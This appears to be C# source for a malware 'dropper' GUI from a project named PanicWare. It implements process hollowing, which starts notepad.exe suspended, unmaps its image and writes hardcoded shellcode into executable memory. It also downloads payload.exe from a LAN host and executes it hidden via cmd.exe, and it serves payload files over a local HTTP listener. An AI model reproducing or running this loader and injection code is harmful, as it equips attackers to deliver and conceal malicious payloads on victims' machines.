using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace PanicWareGui.Forms
{
    public partial class FormDropper : Form
    {
        public FormDropper()
        {
            InitializeComponent();
        }

        private async void HostFilesbtn_Click(object sender, EventArgs e)
        {
            // Update this path to the directory you want to serve
            string baseDirectory = @"C:\Users\kyria\Desktop\github\Panicware\test\";
            string prefix = "http://localhost:8080/";

            HttpListener listener = new HttpListener();
            listener.Prefixes.Add(prefix);

            try
            {
                listener.Start();
                MessageBox.Show($"Server started listening on {prefix}", "Server Started", MessageBoxButtons.OK, MessageBoxIcon.Information);
                Console.WriteLine($"Server started listening on {prefix}");
                await Task.Run(() => HandleRequests(listener, baseDirectory));
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to start server: {ex.Message}", "Server Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Console.WriteLine($"Failed to start server: {ex.Message}");
            }
        }

        private void HandleRequests(HttpListener listener, string baseDirectory)
        {
            try
            {
                while (true)
                {
                    HttpListenerContext context = listener.GetContext();
                    Task.Run(() => ProcessRequest(context, baseDirectory));
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Server stopped: {ex.Message}");
                MessageBox.Show($"Server stopped: {ex.Message}", "Server Stopped", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void ProcessRequest(HttpListenerContext context, string baseDirectory)
        {
            string url = context.Request.RawUrl.TrimStart('/');
            // Handle requests to the root
            if (string.IsNullOrEmpty(url) || url == "/")
            {
                url = "index.html"; // Default file to serve, ensure this file exists in your baseDirectory
            }
            string filePath = Path.Combine(baseDirectory, url);

            try
            {
                if (File.Exists(filePath))
                {
                    byte[] fileBytes = File.ReadAllBytes(filePath);
                    context.Response.ContentType = "application/octet-stream";
                    context.Response.ContentLength64 = fileBytes.Length;
                    context.Response.OutputStream.Write(fileBytes, 0, fileBytes.Length);
                    Console.WriteLine($"Served: {filePath}");
                    MessageBox.Show($"Served: {filePath}", "File Served", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else
                {
                    context.Response.StatusCode = 404;
                    Console.WriteLine($"File not found: {filePath}");
                    MessageBox.Show($"File not found: {filePath}", "File Not Found", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
            }
            catch (Exception ex)
            {
                context.Response.StatusCode = 500;
                Console.WriteLine($"Error serving file: {ex.Message}");
                MessageBox.Show($"Error serving file: {ex.Message}", "Error Serving File", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                context.Response.OutputStream.Close();
            }
        }

        // Process Hollowing

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        ref SECURITY_ATTRIBUTES lpProcessAttributes,
        ref SECURITY_ATTRIBUTES lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        [In] ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        const uint CREATE_SUSPENDED = 0x00000004;

        // Assuming shellcode is a string similar to your example, convert it to a byte array.
        // This is a simplified example. You'll need to adjust it based on the actual format of your shellcode string.
        byte[] shellcode = new byte[]
        {
            0x89, 0xe5, 0x83, 0xec, 0x20, 0x31, 0xdb, 0x64, 0x8b, 0x5b, 0x30, 0x8b, 0x5b, 0x0c, 0x8b, 0x5b,
            0x1c, 0x8b, 0x1b, 0x8b, 0x1b, 0x8b, 0x43, 0x08, 0x89, 0x45, 0xfc, 0x8b, 0x58, 0x3c, 0x01, 0xc3,
            0x8b, 0x5b, 0x78, 0x01, 0xc3, 0x8b, 0x7b, 0x20, 0x01, 0xc7, 0x89, 0x7d, 0xf8, 0x8b, 0x4b, 0x24,
            0x01, 0xc1, 0x89, 0x4d, 0xf4, 0x8b, 0x53, 0x1c, 0x01, 0xc2, 0x89, 0x55, 0xf0, 0x8b, 0x53, 0x14,
            0x89, 0x55, 0xec, 0xeb, 0x32, 0x31, 0xc0, 0x8b, 0x55, 0xec, 0x8b, 0x7d, 0xf8, 0x8b, 0x75, 0x18,
            0x31, 0xc9, 0xfc, 0x8b, 0x3c, 0x87, 0x03, 0x7d, 0xfc, 0x66, 0x83, 0xc1, 0x08, 0xf3, 0xa6, 0x74,
            0x05, 0x40, 0x39, 0xd0, 0x72, 0xe4, 0x8b, 0x4d, 0xf4, 0x8b, 0x55, 0xf0, 0x66, 0x8b, 0x04, 0x41,
            0x8b, 0x04, 0x82, 0x03, 0x45, 0xfc, 0xc3, 0xba, 0x78, 0x78, 0x65, 0x63, 0xc1, 0xea, 0x08, 0x52,
            0x68, 0x57, 0x69, 0x6e, 0x45, 0x89, 0x65, 0x18, 0xe8, 0xb8, 0xff, 0xff, 0xff, 0x31, 0xc9, 0x51,
            0x68, 0x2e, 0x65, 0x78, 0x65, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x89, 0xe3, 0x41, 0x51, 0x53, 0xff,
            0xd0, 0x31, 0xc9, 0xb9, 0x01, 0x65, 0x73, 0x73, 0xc1, 0xe9, 0x08, 0x51, 0x68, 0x50, 0x72, 0x6f,
            0x63, 0x68, 0x45, 0x78, 0x69, 0x74, 0x89, 0x65, 0x18, 0xe8, 0x87, 0xff, 0xff, 0xff, 0x31, 0xd2,
            0x52, 0xff, 0xd0
        };
        private void RunDropperbtn_Click(object sender, EventArgs e)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            SECURITY_ATTRIBUTES saProcess = new SECURITY_ATTRIBUTES();
            SECURITY_ATTRIBUTES saThread = new SECURITY_ATTRIBUTES();

            si.cb = (uint)Marshal.SizeOf(si);

            // Modify the path to the application you want to start in a suspended state
            string systemPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
            string notepadPath = Path.Combine(systemPath, "notepad.exe");

            bool result = CreateProcess(notepadPath, null, ref saProcess, ref saThread, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);

            if (result)
            {
                Console.WriteLine("Process started in suspended state. Process ID: " + pi.dwProcessId);

                // Call CheckProcessArchitecture right after process creation
                bool isWow64 = CheckProcessArchitecture(pi.hProcess);

                // Assume baseAddress contains the base address of the section to unmap
                IntPtr baseAddress = baseAddressFinder(pi.hProcess);

                // Assuming pi.hProcess contains the handle to the suspended process
                int status = NtUnmapViewOfSection(pi.hProcess, baseAddress);

                if (status == 0) // STATUS_SUCCESS is typically 0
                {
                    MessageBox.Show($"Memory section unmapped successfully. Base Address is {baseAddress}", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else
                {
                    MessageBox.Show($"Failed to unmap memory section. NTSTATUS: {status}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }

                // Allocate memory and write the shellcode into the process's memory
                AllocateAndWriteShellcode(pi.hProcess, shellcode);

                // Resume the thread when ready
                // ResumeThread(pi.hThread);
            }
            else
            {
                Console.WriteLine("Failed to start process.");
            }
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        // Unmap the memory from process

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr baseAddress);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, out PROCESS_BASIC_INFORMATION processInformation, int processInformationLength, out int returnLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, out IntPtr lpBuffer, int dwSize, out int lpNumberOfBytesRead);

        public enum PROCESSINFOCLASS
        {
            ProcessBasicInformation = 0
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebBaseAddress;
            public IntPtr Reserved2_0;
            public IntPtr Reserved2_1;
            public IntPtr UniqueProcessId;
            public int Reserved3;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint dwSize, out int lpNumberOfBytesRead);

        private IntPtr baseAddressFinder(IntPtr processHandle)
        {
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            int returnLength;
            int status = NtQueryInformationProcess(processHandle, (int)PROCESSINFOCLASS.ProcessBasicInformation, out pbi, Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)), out returnLength);

            // Debug output
            MessageBox.Show($"Query Status: {status}, PEB Address: {pbi.PebBaseAddress}, Return Length: {returnLength}", "Debug Info: Query", MessageBoxButtons.OK, MessageBoxIcon.Information);

            if (status != 0) // STATUS_SUCCESS is usually 0
            {
                MessageBox.Show($"Failed to query process information. Status: {status}, LastWin32Error: {Marshal.GetLastWin32Error()}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return IntPtr.Zero; // Or handle the error as appropriate
            }

            // Adjust the offset based on architecture
            int pebImageBaseAddressOffset = IntPtr.Size == 8 ? 0x10 : 0x8;
            byte[] buffer = new byte[IntPtr.Size];
            bool success = ReadProcessMemory(processHandle, pbi.PebBaseAddress + pebImageBaseAddressOffset, buffer, (uint)buffer.Length, out int bytesRead);

            // Debug output
            MessageBox.Show($"Read Success: {success}, Bytes Read: {bytesRead}, LastWin32Error: {Marshal.GetLastWin32Error()}", "Debug Info: ReadProcessMemory", MessageBoxButtons.OK, MessageBoxIcon.Information);

            if (!success || bytesRead != IntPtr.Size)
            {
                MessageBox.Show("Failed to read process memory.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return IntPtr.Zero; // Or handle the error as appropriate
            }

            IntPtr imageBaseAddress = IntPtr.Size == 8 ? (IntPtr)BitConverter.ToInt64(buffer, 0) : (IntPtr)BitConverter.ToInt32(buffer, 0);
            MessageBox.Show($"Image Base Address: {imageBaseAddress}", "Debug Info: Base Address", MessageBoxButtons.OK, MessageBoxIcon.Information);
            return imageBaseAddress;
        }


        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        private void AllocateAndWriteShellcode(IntPtr processHandle, byte[] shellcode)
        {
            // Allocate memory in the target process
            IntPtr allocMemAddress = VirtualAllocEx(processHandle, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            if (allocMemAddress == IntPtr.Zero)
            {
                throw new InvalidOperationException("Failed to allocate memory in target process.");
            }

            // Write the shellcode to the allocated memory
            bool result = WriteProcessMemory(processHandle, allocMemAddress, shellcode, (uint)shellcode.Length, out IntPtr bytesWritten);

            if (!result || bytesWritten.ToInt64() != shellcode.Length)
            {
                throw new InvalidOperationException("Failed to write shellcode to target process memory.");
            }
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool IsWow64Process([In] IntPtr processHandle, [Out, MarshalAs(UnmanagedType.Bool)] out bool isWow64);

        public bool CheckProcessArchitecture(IntPtr processHandle)
        {
            bool isWow64;
            if (IsWow64Process(processHandle, out isWow64))
            {
                // If isWow64 is true, the process is a 32-bit process running on a 64-bit OS.
                MessageBox.Show($"Is target process WOW64: {isWow64}", "Process Architecture", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return isWow64;
            }
            else
            {
                // Handle error (e.g., getting last error)
                MessageBox.Show($"Failed to determine process architecture, LastWin32Error: {Marshal.GetLastWin32Error()}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }

        private async void RunShellcodeLoadbtn_Click(object sender, EventArgs e)
        {
            try
            {
                string url = "http://192.168.202.128:8080/payload.exe";

                byte[] payloadBytes;
                using (WebClient client = new WebClient())
                {
                    payloadBytes = await client.DownloadDataTaskAsync(new Uri(url));
                    MessageBox.Show("Downloaded payload.exe into memory", "Download Complete", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    Console.WriteLine("Downloaded payload.exe into memory");
                }

                // Save the payload to a temporary file
                string customDirectory = @"C:\Users\kyria\Desktop\github\Panicware\test";
                string tempFilePath = Path.Combine(customDirectory, "payload.exe");
                /*string tempFilePath = Path.Combine(Path.GetTempPath(), "payload.exe");
                File.WriteAllBytes(tempFilePath, payloadBytes); // Synchronous version*/

                // Create a new process to run the payload with parameters
                System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c {tempFilePath} -h",  // Adjust parameters as necessary
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };

                using (System.Diagnostics.Process process = new System.Diagnostics.Process())
                {
                    process.StartInfo = psi;
                    process.Start();
                    string output = await process.StandardOutput.ReadToEndAsync();
                    string error = await process.StandardError.ReadToEndAsync();
                    process.WaitForExit();

                    // Display the output and error (if any) in the console or message box
                    if (!string.IsNullOrEmpty(output))
                    {
                        Console.WriteLine($"Output: {output}");
                        MessageBox.Show(output, "Output", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }

                    if (!string.IsNullOrEmpty(error))
                    {
                        Console.WriteLine($"Error: {error}");
                        MessageBox.Show(error, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to download or execute payload: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Console.WriteLine($"Failed to download or execute payload: {ex.Message}");
            }
        }
    }
}
